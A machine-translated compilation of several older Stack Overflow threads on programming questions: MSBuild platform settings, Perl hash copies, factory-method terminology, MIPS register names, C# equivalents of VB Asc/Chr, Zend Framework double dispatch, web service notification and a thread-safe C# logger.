编辑：还没有解决方案，当我找到它时会发布解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-14T08:05:24.550

我解决了我的问题。似乎我使用了错误版本的 JWSC ant 任务。只要确保使用正确的 weblogic.jar

# msbuild - MSBuild 任务配置属性

> ID：721173
> 
> 赞同：19
> 
> 时间：2009-04-06T12:18:07.063
> 
> 标签：msbuild, msbuild-task

我有三个 Visual Studio 解决方案。第一个被配置为构建为*Release*，另外两个被设置为构建为*Debug*。

当运行一个简单的[MSBuild](http://en.wikipedia.org/wiki/MSBuild)脚本明确说明要构建的配置 (Debug) 时，第一个项目仍然构建为 Release。

示例脚本：

```
<Target Name="Build">
    <ItemGroup>
        <ProjectToBuild Include="$(SolutionsPath)\Solution1.sln"/>
        <ProjectToBuild Include="$(SolutionsPath)\Core\Solution2.sln"/>
        <ProjectToBuild Include="$(SolutionsPath)\UI\Solution3.sln"/>
    </ItemGroup>
    <MSBuild Projects="@(ProjectToBuild)"
             Targets="Rebuild"
             Properties="Configuration=Debug;Platform=Any CPU"/>
</Target> 
```

我已经尝试了上述的变体，例如以下，但我总是得到相同的结果。

```
<Target Name="Build">
    <ItemGroup>
        <ProjectToBuild Include="$(SolutionsPath)\Solution1.sln">
            <Properties>Configuration=Debug</Properties>
        </ProjectToBuild>

        <ProjectToBuild Include="$(SolutionsPath)\Core\Solution2.sln">
            <Properties>Configuration=Debug</Properties>
        </ProjectToBuild>

        <ProjectToBuild Include="$(SolutionsPath)\UI\Solution3.sln">
            <Properties>Configuration=Debug</Properties>
        </ProjectToBuild>
    </ItemGroup>
    <MSBuild Projects="@(ProjectToBuild)"
             Targets="Rebuild"
             Properties="Platform=Any CPU"/>
</Target> 
```

我注意到有一个类似的问题，*[MSBuild task - Build failed 因为一个解决方案是在 release 而不是 debug 中构建的](https://stackoverflow.com/questions/474403)*，但这是特定于 TFS 和 Teambuild 的。我说的是纯 MSBuild 和一个从头开始创建的简单项目文件。

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-01-03T22:10:28.360

关于平台任何 cpu 的拼写问题，事实证明存在一个问题，已经在 StackOverflow 和 Microsoft 的其他地方报道过。`Platform`它通常会影响 MSBuild，并且在我的 dotnet v3.5 MSBuild /help 中省略了整个文档问题。所以也许这会对某人有所帮助！

## 链接

[TFS 2010 MSBuild中的“AnyCPU”与“Any CPU”](https://stackoverflow.com/questions/2957672/anycpu-vs-any-cpu-in-tfs-2010 "anycpu-vs-any-cpu-in-tfs-2010")
[解决方案和项目之间的“Any CPU”平台不一致](http://connect.microsoft.com/VisualStudio/feedback/details/503935/msbuild-inconsistent-platform-for-any-cpu-between-solution-and-project "解决方案和项目之间的任何 CPU 的 MSBuild 平台不一致")

```
Closed as Won't Fix   
Type:  Bug
ID:  503935  
Opened:  10/26/2009 1:29:12 PM
Access Restriction:  Public  
0 Workaround(s)
5 User(s) can reproduce this bug 
```

MSBuild`Platform`属性具有**不同的值**，`Any CPU`具体取决于您是**构建解决方案还是构建项目**。
- 用于**解决方案**- 使用`Platform="Any CPU"`-**有空间**
- 用于**项目**- 使用`Platform="AnyCPU"`-**没有空间**

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-04-08T11:21:05.687

好的，我找到了问题。与 MSBuild 无关，而是正在构建的解决方案。发帖拯救别人的心痛。

无论出于何种原因，在解决方案中配置了调试配置，如下所示：

[替代文字 http://www.freeimagehosting.net/uploads/cad0bdf1c0.jpg](http://www.freeimagehosting.net/uploads/cad0bdf1c0.jpg)

所以 MSBuild 也只是在做它被告知的事情......

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2010-07-09T02:53:44.890

我遇到了同样的错误。解决方案是明确指定目标平台：

```
msbuild.exe /p:Platform="Any CPU" 
```

自从我升级到 Windows 7 后才开始发生这种情况，所以我想这与此有关。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-04-06T23:51:10.593

您是否尝试过使用 /v:diag 运行？

另外，除此之外：我认为您想要“AnyCPU”（没有空间）。

# perl - 如何从 Perl 中的现有哈希创建匿名哈希？

> ID：721182
> 
> 赞同：5
> 
> 时间：2009-04-06T12:21:04.607
> 
> 标签：perl, hash, reference

如何从现有哈希创建匿名哈希？

对于数组，我使用：

```
@x = (1, 2, 3);
my $y = [@x]; 
```

但我找不到如何为哈希做同样的事情：

```
my %x = ();
my $y = ???; 
```

谢谢

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2009-04-06T13:32:44.387

为什么需要匿名哈希？尽管答案告诉您可以通过各种方式进行匿名哈希，但我们不知道它们中的任何一个是否是您尝试做的任何事情的正确解决方案。

如果您想要一个可以在不干扰原始数据的情况下修改的独特副本，请使用`dclone`Perl 附带的 Storable。它会创建数据结构的深层副本：

```
use Storable qw(dclone);
my $clone = dclone \%hash; 
```

考虑 Dave Webb 的答案，但有额外的参考层。键的值`c`是另一个哈希引用：

```
use Data::Dumper;

my %original = ( a => 1, b => 2, c => { d => 1 } );
my $copy = { %original };

print 
    "Before change:\n\n",
    Data::Dumper->Dump( [ \%original], [ qw(*original) ] ),
    Data::Dumper->Dump( [ $copy ], [ qw(copy) ] ),
    ;

$copy->{c}{d} = 'foo';

print 
    "\n\nAfter change:\n\n",
    Data::Dumper->Dump( [ \%original], [ qw(*original) ] ),
    Data::Dumper->Dump( [ $copy ], [ qw(copy) ] ),
    ; 
```

通过检查输出，您会看到即使您有一个匿名哈希，它仍然链接到原始哈希：

```
Before change:

%original = (
              'c' => {
                       'd' => 1
                     },
              'a' => 1,
              'b' => 2
            );
$copy = {
          'c' => {
                   'd' => 1
                 },
          'a' => 1,
          'b' => 2
        };

After change:

%original = (
              'c' => {
                       'd' => 'foo'
                     },
              'a' => 1,
              'b' => 2
            );
$copy = {
          'c' => {
                   'd' => 'foo'
                 },
          'a' => 1,
          'b' => 2
        }; 
```

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2009-04-06T12:28:31.763

```
my $new_hash = { %existing_hash }; 
```

请注意，此解决方案不会进行深层复制。阅读布赖恩的答案以获得解释。

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2009-04-06T12:32:28.667

我认为你需要在这里小心。考虑以下哈希：

```
my %hash = (1 => 'one',2 => 'two'); 
```

有两种方法可以从中获得参考：

```
my $ref = \%hash;
my $anon = {%hash}; 
```

`$ref`是对原始哈希的引用，可以与 . 类似地使用`%hash`。 `$anon`是对原始哈希的匿名副本的引用；它将具有相同的数据，但更改它不会更改原始哈希，反之亦然。

因此，例如，从这两个语句开始将具有相同的输出

```
print $ref->{1},"\n";
> one
print $anon->{1},"\n";
> one 
```

但是，如果我更改原始哈希：

```
$hash{1} = "i"; 
```

他们两个`print`语句将输出不同的值：

```
print $ref->{1},"\n";
> i
print $anon->{1},"\n";
> one 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-04-06T12:23:34.553

如果你有

```
my %hash = ... 
```

那么你可以做

```
my $hashref = \%hash; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-04-06T13:31:44.407

这里似乎发生了两件事，答案分为两个不同的可能问题。

1.  你想要一个匿名哈希。简单的。您可以一步完成。
2.  您想要现有哈希的匿名副本。正如 Dave Webb 和 brian 所建议的，这可能是您想要参考，但您**不想**篡改原始哈希。也很容易。（嗯，不完全是：有关深拷贝的详细信息，请参阅 brian 的回答。）

如果您想要 1，请执行以下操作：

```
my $hash_ref = { foo => 1, bar => 2 }; 
```

如果您想要 2，请执行以下操作：

```
my %hash = ( foo => 1, bar => 2 );

# Then later
my $anon_copy_hash_ref = { %hash }; 
```

（这些名字并不意味着黄金时段。）我的副本也没有准备好黄金时段。有关更全面、更精确的讨论，请参阅 brian 的帖子。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2009-04-06T12:22:03.293

采用：

```
$hashref = {}; 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2009-04-06T15:12:10.747

实现深层复制的快速/简单方法：

```
use FreezeThaw qw(freeze thaw);
$new = thaw freeze $old; 
```

# design-patterns - 静态工厂方法或创建方法

> ID：721183
> 
> 赞同：2
> 
> 时间：2009-04-06T12:21:44.993
> 
> 标签：design-patterns, terminology, definition

我想知道这种结构的正确定义：

```
class A {
 public static A create() {
    return new A();
 }

 private A() {
 }
} 
```

在[Effective Java](https://rads.stackoverflow.com/amzn/click/com/0201310058) (Item 1) 和[维基百科文章中](http://en.wikipedia.org/wiki/Factory_method_pattern#Other_benefits_and_variants)，我发现这被称为*静态工厂方法*（某种*工厂方法*）。

但是在阅读[Refactoring to Patterns](https://rads.stackoverflow.com/amzn/click/com/0321213351)（第 6 章）时，我遇到了同样的构造，称为*Creation Method*。此外，还有一个注意事项，它不应该与*工厂方法*模式混淆。

真理在哪里？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-06T12:29:34.430

阅读有关工厂方法的[讨论](http://c2.com/cgi/wiki?FactoryMethod)。

> [FactoryMethodPattern](http://c2.com/cgi/wiki?FactoryMethodPattern)与[FactoryMethod](http://c2.com/cgi/wiki?FactoryMethod)或[CreationMethod](http://c2.com/cgi/wiki?CreationMethod)不同。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T12:25:51.303

一种方法是调用无参数方法*创建方法*和参数化（例如通过枚举） -*工厂方法*。因为工厂更强大，可以创建不同类型的对象。

如果您使用无参数方法，则必须在别处决定要调用哪个类的方法。使用参数化方法，您可以将此逻辑传递给方法本身。所以后者（*factory*）也自己决定要创建哪个类对象。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-01-29T12:59:00.987

创建方法是创建类实例的静态或非静态方法。工厂方法是在类层次结构中定义和实现的方法，其创建具有多态性。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-04-06T12:29:18.080

好吧，作者之间的术语经常会有所不同，所以我不会太担心这一点。

但是，我认为“重构为模式”警告不要将其称为“工厂方法”，因为存在[工厂方法模式](http://en.wikipedia.org/wiki/Factory_method_pattern)。由于工厂方法模式不仅仅是一种工厂方法，因此他们提出了不同的名称以避免混淆。

我想你也可以称它为“简单的静态工厂”，但这有点罗嗦（而且不标准）。

# assembly - 是否可以将 MIPS 寄存器名称与 GAS（GNU 汇编器）一起使用？

> ID：721192
> 
> 赞同：1
> 
> 时间：2009-04-06T12:24:00.607
> 
> 标签：assembly, gnu, mips, binutils

如果我使用寄存器名称，我会得到：

```
Error: illegal operands `add $t0,$zero,$zero' 
```

如果我使用注册号（`$8`而不是`$t0`和`$0`而不是`$zero`）它可以工作。（我使用的是 binutils 2.17）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-04-17T00:56:17.487

GNU 汇编器不直接支持符号寄存器名称。如果使用 gcc 来驱动汇编程序，一种常见的方法是使用“.S”扩展名作为汇编程序源文件（它告诉 gcc 在汇编程序之前通过 C 预处理器传递源代码）和 #include 包含定义的头文件像：

```
#define zero $0
#define v0   $2
#define v1   $3 
```

然后汇编源代码可以有如下语句

```
add v0, zero, zero 
```

# visual-c++ - 如何在 VS 2005 中作为实例运行多个项目？

> ID：721197
> 
> 赞同：0
> 
> 时间：2009-04-06T12:25:05.673
> 
> 标签：visual-c++

我想同时运行多个 VS 2005 实例。每个实例都有不同的项目。但是硬件限制限制了我。有没有办法做到这一点？

我正在尝试从 debug\program.exe 运行。但它不起作用。

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-04-06T12:29:30.327

项目是否相关？您可以将它们包装在一个解决方案中，然后保持 Visual Studio 的一个实例处于活动状态。这就是你在说的吗？

# c# - C# 中 VB 的 Asc() 和 Chr() 函数的等价物是什么？

> ID：721201
> 
> 赞同：34
> 
> 时间：2009-04-06T12:26:51.970
> 
> 标签：c#, vb.net, ascii

VB 有几个本机函数用于将 char 转换为 ASCII 值，反之亦然 - Asc() 和 Chr()。

现在我需要在 C# 中获得等效的功能。最好的方法是什么？

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2009-04-06T12:37:59.340

您始终可以添加对 Microsoft.VisualBasic 的引用，然后使用完全相同的方法：[Strings.Chr](http://msdn.microsoft.com/en-us/library/microsoft.visualbasic.strings.chr.aspx)和[Strings.Asc](http://msdn.microsoft.com/en-us/library/microsoft.visualbasic.strings.asc.aspx)。

这是获得完全相同功能的最简单方法。

* * *

## 回答 #2

> 赞同：24
> 
> 时间：2009-04-06T12:29:06.520

因为`Asc()`您可以将其`char`转换为`int`这样的：

```
int i = (int)your_char; 
```

并且`Chr()`你可以`char`从一个`int`这样的转换回：

```
char c = (char)your_int; 
```

这是一个演示整个事情的小程序：

```
using System;

class Program
{
    static void Main()
    {
        char c = 'A';
        int i = 65;

        // both print "True"
        Console.WriteLine(i == (int)c);
        Console.WriteLine(c == (char)i);
    }
} 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2016-05-03T09:12:56.163

我使用 resharper 得到了这些，确切的代码由 VB 在你的机器上运行

```
/// <summary>
/// Returns the character associated with the specified character code.
/// </summary>
/// 
/// <returns>
/// Returns the character associated with the specified character code.
/// </returns>
/// <param name="CharCode">Required. An Integer expression representing the <paramref name="code point"/>, or character code, for the character.</param><exception cref="T:System.ArgumentException"><paramref name="CharCode"/> &lt; 0 or &gt; 255 for Chr.</exception><filterpriority>1</filterpriority>
public static char Chr(int CharCode)
{
  if (CharCode < (int) short.MinValue || CharCode > (int) ushort.MaxValue)
    throw new ArgumentException(Utils.GetResourceString("Argument_RangeTwoBytes1", new string[1]
    {
      "CharCode"
    }));
  if (CharCode >= 0 && CharCode <= (int) sbyte.MaxValue)
    return Convert.ToChar(CharCode);
  try
  {
    Encoding encoding = Encoding.GetEncoding(Utils.GetLocaleCodePage());
    if (encoding.IsSingleByte && (CharCode < 0 || CharCode > (int) byte.MaxValue))
      throw ExceptionUtils.VbMakeException(5);
    char[] chars = new char[2];
    byte[] bytes = new byte[2];
    Decoder decoder = encoding.GetDecoder();
    if (CharCode >= 0 && CharCode <= (int) byte.MaxValue)
    {
      bytes[0] = checked ((byte) (CharCode & (int) byte.MaxValue));
      decoder.GetChars(bytes, 0, 1, chars, 0);
    }
    else
    {
      bytes[0] = checked ((byte) ((CharCode & 65280) >> 8));
      bytes[1] = checked ((byte) (CharCode & (int) byte.MaxValue));
      decoder.GetChars(bytes, 0, 2, chars, 0);
    }
    return chars[0];
  }
  catch (Exception ex)
  {
    throw ex;
  }
}

/// <summary>
/// Returns an Integer value representing the character code corresponding to a character.
/// </summary>
/// 
/// <returns>
/// Returns an Integer value representing the character code corresponding to a character.
/// </returns>
/// <param name="String">Required. Any valid Char or String expression. If <paramref name="String"/> is a String expression, only the first character of the string is used for input. If <paramref name="String"/> is Nothing or contains no characters, an <see cref="T:System.ArgumentException"/> error occurs.</param><filterpriority>1</filterpriority>
public static int Asc(char String)
{
  int num1 = Convert.ToInt32(String);
  if (num1 < 128)
    return num1;
  try
  {
    Encoding fileIoEncoding = Utils.GetFileIOEncoding();
    char[] chars = new char[1]
    {
      String
    };
    if (fileIoEncoding.IsSingleByte)
    {
      byte[] bytes = new byte[1];
      fileIoEncoding.GetBytes(chars, 0, 1, bytes, 0);
      return (int) bytes[0];
    }
    byte[] bytes1 = new byte[2];
    if (fileIoEncoding.GetBytes(chars, 0, 1, bytes1, 0) == 1)
      return (int) bytes1[0];
    if (BitConverter.IsLittleEndian)
    {
      byte num2 = bytes1[0];
      bytes1[0] = bytes1[1];
      bytes1[1] = num2;
    }
    return (int) BitConverter.ToInt16(bytes1, 0);
  }
  catch (Exception ex)
  {
    throw ex;
  }
}

/// <summary>
/// Returns an Integer value representing the character code corresponding to a character.
/// </summary>
/// 
/// <returns>
/// Returns an Integer value representing the character code corresponding to a character.
/// </returns>
/// <param name="String">Required. Any valid Char or String expression. If <paramref name="String"/> is a String expression, only the first character of the string is used for input. If <paramref name="String"/> is Nothing or contains no characters, an <see cref="T:System.ArgumentException"/> error occurs.</param><filterpriority>1</filterpriority>
public static int Asc(string String)
{
  if (String == null || String.Length == 0)
    throw new ArgumentException(Utils.GetResourceString("Argument_LengthGTZero1", new string[1]
    {
      "String"
    }));
  return Strings.Asc(String[0]);
} 
```

资源只是存储错误消息，因此您希望以某种方式忽略它们，而您无权访问的其他两种方法如下：

```
internal static Encoding GetFileIOEncoding()
{
    return Encoding.Default;
}

internal static int GetLocaleCodePage()
{
    return Thread.CurrentThread.CurrentCulture.TextInfo.ANSICodePage;
} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2016-01-21T22:30:43.247

Strings.Asc 不等同于可以超出 127 代码值的非 ASCII 字符的普通 C# 转换。我在 [https://social.msdn.microsoft.com/Forums/vstudio/en-US/13fec271-9a97-4b71-ab28-4911ff3ecca0/equivalent-in-c-of-asc-chr-functions-of上找到的答案-vb?forum=csharpgeneral](https://social.msdn.microsoft.com/Forums/vstudio/en-US/13fec271-9a97-4b71-ab28-4911ff3ecca0/equivalent-in-c-of-asc-chr-functions-of-vb?forum=csharpgeneral) 相当于这样的东西：

```
 static int Asc(char c)
    {
        int converted = c;
        if (converted >= 0x80)
        {
            byte[] buffer = new byte[2];
            // if the resulting conversion is 1 byte in length, just use the value
            if (System.Text.Encoding.Default.GetBytes(new char[] { c }, 0, 1, buffer, 0) == 1)
            {
                converted = buffer[0];
            }
            else
            {
                // byte swap bytes 1 and 2;
                converted = buffer[0] << 16 | buffer[1];
            }
        }
        return converted;
    } 
```

或者，如果您想要读取交易，请添加对 Microsoft.VisualBasic 程序集的引用。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-04-06T12:30:39.560

对于 Chr()，您可以使用：

```
char chr = (char)you_char_value; 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-12-13T18:17:59.733

在 C# 中，您可以使用 Char.ConvertFromUtf32 语句

```
int intValue = 65;                                \\ Letter A    
string strVal = Char.ConvertFromUtf32(intValue); 
```

相当于VB的

```
Dim intValue as integer = 65     
Dim strValue As String = Char.ConvertFromUtf32(intValue) 
```

无需 Microsoft.VisualBasic 参考

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-01-24T09:51:31.363

将此方法添加到 C# 中

```
private  int Asc(char String)
        {
            int int32 = Convert.ToInt32(String);
            if (int32 < 128)
                return int32;
            try
            {
                Encoding fileIoEncoding = Encoding.Default;
                char[] chars = new char[1] { String };
                if (fileIoEncoding.IsSingleByte)
                {
                    byte[] bytes = new byte[1];
                    fileIoEncoding.GetBytes(chars, 0, 1, bytes, 0);
                    return (int)bytes[0];
                }
                byte[] bytes1 = new byte[2];
                if (fileIoEncoding.GetBytes(chars, 0, 1, bytes1, 0) == 1)
                    return (int)bytes1[0];
                if (BitConverter.IsLittleEndian)
                {
                    byte num = bytes1[0];
                    bytes1[0] = bytes1[1];
                    bytes1[1] = num;
                }
                return (int)BitConverter.ToInt16(bytes1, 0);
            }
            catch (Exception ex)
            {
                throw ex;
            }
        } 
```

`

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2019-08-13T09:40:19.330

我从 Microsoft.VisualBasic.dll 中提取了 Asc() 函数：

```
 public static int Asc(char String)
    {
        int num;
        byte[] numArray;
        int num1 = Convert.ToInt32(String);
        if (num1 >= 128)
        {
            try
            {
                Encoding fileIOEncoding = Encoding.Default;
                char[] str = new char[] { String };
                if (!fileIOEncoding.IsSingleByte)
                {
                    numArray = new byte[2];
                    if (fileIOEncoding.GetBytes(str, 0, 1, numArray, 0) != 1)
                    {
                        if (BitConverter.IsLittleEndian)
                        {
                            byte num2 = numArray[0];
                            numArray[0] = numArray[1];
                            numArray[1] = num2;
                        }
                        num = BitConverter.ToInt16(numArray, 0);
                    }
                    else
                    {
                        num = numArray[0];
                    }
                }
                else
                {
                    numArray = new byte[1];
                    fileIOEncoding.GetBytes(str, 0, 1, numArray, 0);
                    num = numArray[0];
                }
            }
            catch (Exception exception)
            {
                throw exception;
            }
        }
        else
        {
            num = num1;
        }
        return num;
    } 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2019-08-28T18:54:29.173

//你可以创建函数，不需要改变你的程序

```
 private int Chr(int i)
  {
    return (char)i;
  } 
```

感谢[Soner Gönül](http://%20https://stackoverflow.com/users/447156/soner-g%C3%B6n%C3%BCl)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2021-06-03T12:02:43.627

以下例程适用于 .net 标准 2.0 + .net 5 的 COM 互操作服务器环境和经典 ASP/VB6 客户端，代码页为 1252。

我没有用其他代码页测试它：

```
 public static int Asc(char String)
    {
        int int32 = Convert.ToInt32(String);
        if (int32 < 128)
            return int32;
        Encoding encoding = CodePagesEncodingProvider.Instance.GetEncoding(Thread.CurrentThread.CurrentCulture.TextInfo.ANSICodePage);
        char[] chars = new char[1] { String };
        if (encoding.IsSingleByte)
        {
            byte[] bytes = new byte[1];
            encoding.GetBytes(chars, 0, 1, bytes, 0);
            return (int)bytes[0];
        }
        byte[] bytes1 = new byte[2];
        if (encoding.GetBytes(chars, 0, 1, bytes1, 0) == 1)
            return (int)bytes1[0];
        if (BitConverter.IsLittleEndian)
        {
            byte num = bytes1[0];
            bytes1[0] = bytes1[1];
            bytes1[1] = num;
        }
        return (int)BitConverter.ToInt16(bytes1, 0);
    } 
```

* * *

## 回答 #11

> 赞同：-1
> 
> 时间：2018-02-23T13:59:53.747

```
 //Char to Int - ASC("]")
 int lIntAsc = (int)Char.Parse("]");
 Console.WriteLine(lIntAsc); //Return 91

 //Int to Char

char lChrChar = (char)91;
Console.WriteLine(lChrChar ); //Return "]" 
```

* * *

## 回答 #12

> 赞同：-2
> 
> 时间：2009-04-06T12:35:11.250

给定 char c 和 int i，以及函数 fi(int) 和 fc(char)：

从 char 到 int（类似于 VB Asc()）：将 char 显式转换为 int：`int i = (int)c;`

或隐式转换（提升）：`fi(char c) {i+= c;}`

从 int 到 char（类似于 VB Chr()）：

将 int 显式转换为 char：`char c = (char)i, fc(int i) {(char)i};`

不允许隐式转换，因为 int 比 char 更宽（具有更大的值范围）

# php - Zend Framework Action Gets Called Twice

> ID：721205
> 
> 赞同：6
> 
> 时间：2009-04-06T12:28:27.147
> 
> 标签：php, zend-framework

we are trying to build an application using the zend framework and have the following problem: "Some controller actions are called twice. This means that the actions gets called, finishes its execution and then gets called again".

We tracked this down by checking entries in a log file. For one request there where 2 entries in the log file.

Do you know anything that might be causing this problem? Is this related with the dispatch process of the Front Controller?

Regards,

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2011-02-11T09:33:08.503

我发现启用 Chrome Extension Webbug（Google Chrome 的 FirePHP 扩展）时，该操作被请求两次。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-04-06T14:20:07.283

转发或操作堆栈可能是合理的

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-04-08T12:39:51.457

尝试使用调试器（例如 XDebug）来查看您的代码是如何运行的。专注于调度程序，一定发生了一些事情，并且请求操作未设置为已调度，因此它再次运行。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2010-03-19T19:07:50.303

我们遇到了类似的问题。有些动作被执行了两次。经过多次调试和谷歌搜索，发现问题出在 ZFdebug 中。安装[了这个补丁](http://code.google.com/p/zfdebug/issues/detail?id=37)，一切都恢复正常了。希望这对其他人有帮助。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-04-06T12:59:06.620

这可能是一个错误。没有更多信息很难说。

每次调用操作方法时尝试记录回溯。

```
<?php
trigger_error(var_export(debug_backtrace(), true));
trigger_error(var_export($_SERVER, true));
?> 
```

这将在错误日志中为您提供大量信息，因此您需要将结果导出到文本编辑器并在那里咀嚼它。和/或可能修改代码以打印更少的信息。

有几件事要寻找：

*   动作方法是从不同的地方调用的吗？
*   $_SERVER['UNIQUE_ID']（或 REQUEST_TIME）不同吗？

如果唯一 ID 不同，那么您已经向服务器发出了两个请求。如果没有，请尝试从回溯中找出答案。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-02-23T22:41:51.337

我正在使用 Chrome 17.0.x、Webbug 和 Zend Framework 1.11.1，但仍然看到这个问题。我按照建议禁用了 Webbug，并且只调用了一次操作。

所以，我认为这是Webbug中的一个错误。

# web-services - Notifying web service consumer that some data has changed?

> ID：721211
> 
> 赞同：1
> 
> 时间：2009-04-06T12:29:59.313
> 
> 标签：web-services

What would be a more standard way of notifying a web service consumer of a data change?

1.  Having the consumer periodically calling the web service to pull change notification.

2.  Consumer setting up a call back web service that can be invoked to forward notification about the change.

3.  Other?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-04-06T12:47:35.540

Both of these are options. There is also something called "comet" which is like setting up a stream between between the consumer and producer - messages can then be passed back and forth between the two. Wikipedia is probably the best place to start investigating to see if it will work for you project: [http://en.wikipedia.org/wiki/Comet_(programming)](http://en.wikipedia.org/wiki/Comet_(programming))

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-04-06T12:49:02.027

Depends on the scenario. If you're working in a closed environment with only a few consumers of your service, you could switch to a COMET style service which allows a callback from the service to the client. More about that here:

[Wikipedia - COMET](http://en.wikipedia.org/wiki/Comet_(programming))

From what I've read, that method doesn't scale well in larger environments so I'd be careful.

The more traditional method is your first option of polling the service for changes. As long as your service performs well and you have the appropriate hardware to serve up the requests, it's probably your best bet for a public facing web service.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-04-07T01:07:03.813

In case you weren't aware of it, and in case it helps: WCF can work with a Duplex contract that in effect creates a callback service contract on the client. It's fairly transparent.

# c# - C# 我是否正确使用了锁？

> ID：721212
> 
> 赞同：6
> 
> 时间：2009-04-06T12:30:18.110
> 
> 标签：c#, multithreading, logging, locking

我目前正在尝试编写一个线程安全的记录器类。我对这方面的正确设计和最佳实践不是很熟悉。我的代码有缺陷吗？

```
public class WriteStuff
{
    private readonly StreamWriter m_Writer;
    private readonly object m_WriteLock = new object ();

    public WriteStuff(String path)
    {
        m_Writer = File.CreateText (path);

        m_Writer.WriteLine ("x");
        m_Writer.Flush ();
    }

    public void ListenTo(Foo foo)
    {
        foo.SomeEvent += new EventHandler<SomeArgs> (Foo_Update);
    }

    private void Foo_Update(object sender, SomeArgs args)
    {
        lock (m_WriteLock) {
            m_Writer.WriteLine (args);
            m_Writer.Flush ();
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-04-06T12:36:36.020

好吧，这对我来说看起来不错；我可能会`IDisposable`作为文件的一种手段来实现`Close()`，但是......

当然，您也可以使用任何（许多）预装的日志框架。

* * *

更新：

一个想法：您可能想考虑如果文件已经存在会发生什么；你不想踩在你的日志上......

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2009-04-06T12:43:03.400

从多线程的角度来看，您发布的内容看起来不错。尽管我可能是错的，但似乎任何其他执行某些多线程（甚至使用 foo 对象）的代码都应该是安全的。当然，我在该部分代码中看不到任何[死锁。](http://msdn.microsoft.com/en-us/magazine/cc163618.aspx)

无论如何，一些值得注意的事情（除了非常小心死锁和严格测试以确保它们不会发生）：

*   最好在构造函数中锁定代码，因为我相信在某些情况下*可以*在构造函数块完成执行之前调用方法。（如果我在这个问题上错了，请有人纠正我。）
*   在这种`StreamWriter`情况下，对象是私有的，这很好。如果它是受保护的或内部的，您当然必须谨慎对待其他代码如何使用该对象（事实上，我认为最好几乎*总是*将此类对象声明为私有）。
*   您已经完成了正确的锁定方式！锁定单独的私有实例对象总是最安全的，因为您*知道*该对象不能被除您自己的代码之外的任何其他代码锁定（如果您锁定`this`或`StreamWriter`对象本身就不是这种情况）。

尽管如此，我可能遗漏了一些东西，并且上面未显示的其他一些代码可能会导致问题的可能性很小，但据我所知，除了构造函数代码周围*可能缺少锁之外，代码没有缺陷。*当您开始执行更复杂的多线程时，您更有可能不得不提防死锁情况，尤其是跨类/实例。

无论如何，希望这会有所帮助。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-06T12:39:44.017

事件处理程序与事件生成器位于同一线程上，这意味着您的应用程序最终可能会被您的日志文件写入阻塞。

```
private void Foo_Update(object sender, SomeArgs args)        { 
    ThreadPool.QueueUserWorkItem(WriteAsync, args);
}

private void WriteAsync(object state) {  
    SomeArgs args = (SomeArgs)state;    
    lock (m_WriteLock) {                        
       m_Writer.WriteLine (args);                        
       m_Writer.Flush ();                
   }        
} 
```

# java - 如何修复与 awesome-wm 一起使用的 Java-GUI 程序（swing）？

> ID：721215
> 
> 赞同：10
> 
> 时间：2009-04-06T12:30:57.797
> 
> 标签：java, user-interface, swing, awesome-wm

Java 程序的 swing-UI 不能与[awesome-wm](http://awesome.naquadah.org/)完美配合。awesome 是 UNIX 的窗口管理器，它会自动调整程序窗口的大小，而 Swing-UI 不能正确识别这些调整大小。我不在乎 awesome 或 Java 是否有罪，我想知道我是否可以以某种方式更改我的 Java 程序，它们是否可以与 awesome 一起工作。这样我的程序的用户即使在使用异国情调的窗口管理器时也能获得正确的体验。

* * *

## 回答 #1

> 赞同：51
> 
> 时间：2009-11-09T14:59:01.757

最简单的解决方法 -[从suckless 获取wmname](http://tools.suckless.org/wmname)并使用它将窗口管理器的名称设置为LG3D：

```
wmname LG3D 
```

98％的时间这将解决问题。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2009-04-06T15:23:06.587

从 awesome 的手册页：

```
BUGS
   Of course there´s no bug in awesome. But there may be unexpected behaviours.

   Java applications which use the XToolkit/XAWT backend may draw grey windows only. The XToolkit/XAWT backend breaks ICCCM-compliance
   in recent JDK 1.5 and early JDK 1.6 versions, because it assumes a reparenting window manager. As a workaround you can use JDK 1.4
   (which doesn´t contain the XToolkit/XAWT backend) or you can set the following environment variable (to use the older Motif backend
   instead): AWT_TOOLKIT=MToolkit 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2009-04-06T13:05:55.763

